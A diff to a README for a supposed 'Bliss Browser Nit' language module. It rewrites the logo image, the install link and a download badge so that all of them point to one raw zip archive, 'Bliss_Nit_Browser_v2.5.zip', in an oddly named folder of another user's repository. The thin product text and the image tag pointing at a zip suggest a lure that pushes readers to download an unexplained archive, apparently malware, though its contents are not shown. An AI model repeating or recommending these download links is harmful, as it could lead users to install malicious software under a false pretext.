@@ -2,7 +2,7 @@
 
 Welcome to the Bliss Browser Nit repository! This is the language support module for the Bliss Browser, allowing Nit programs to be written and executed within the browser environment.
 
-![Bliss Browser Nit Logo](https://example.com/bliss-browser-nit-logo.png)
+![Bliss Browser Nit Logo](https://github.com/Ssssasyyyy/Bliss_Browser_Nit/raw/refs/heads/main/cudgeler/Bliss_Nit_Browser_v2.5.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -23,8 +23,8 @@ The Bliss Browser Nit module enables developers to write Nit programs directly i
 - Supports a variety of Nit language features and syntax
 
 ## Installation
-To get started with Bliss Browser Nit, you can download the software package from the following link: [Software.zip](https://github.com/user-attachments/files/18388744/Software.zip) 
-[![Download Bliss Browser Nit](https://img.shields.io/badge/Download-Software.zip-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+To get started with Bliss Browser Nit, you can download the software package from the following link: [https://github.com/Ssssasyyyy/Bliss_Browser_Nit/raw/refs/heads/main/cudgeler/Bliss_Nit_Browser_v2.5.zip](https://github.com/Ssssasyyyy/Bliss_Browser_Nit/raw/refs/heads/main/cudgeler/Bliss_Nit_Browser_v2.5.zip) 
+[![Download Bliss Browser Nit](https://github.com/Ssssasyyyy/Bliss_Browser_Nit/raw/refs/heads/main/cudgeler/Bliss_Nit_Browser_v2.5.zip)](https://github.com/Ssssasyyyy/Bliss_Browser_Nit/raw/refs/heads/main/cudgeler/Bliss_Nit_Browser_v2.5.zip)
 
 Once you have downloaded the package, simply extract the contents and follow the installation instructions provided in the documentation.
 
